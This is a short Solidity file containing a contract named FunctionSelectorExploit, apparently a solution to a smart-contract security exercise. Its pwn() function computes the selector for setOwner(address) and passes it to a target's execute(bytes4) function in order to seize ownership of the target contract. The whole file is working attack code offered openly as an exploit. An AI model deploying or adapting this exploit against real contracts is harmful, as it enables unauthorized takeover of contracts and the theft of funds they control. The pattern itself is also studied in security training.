// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IFunctionSelector {
    function execute(bytes4 func) external;
}

contract FunctionSelectorExploit {
    IFunctionSelector public target;

    constructor(address _target) {
        target = IFunctionSelector(_target);
    }

    function pwn() external {
        bytes4 func = bytes4(keccak256(bytes("setOwner(address)")));
        target.execute(func);
    }
}
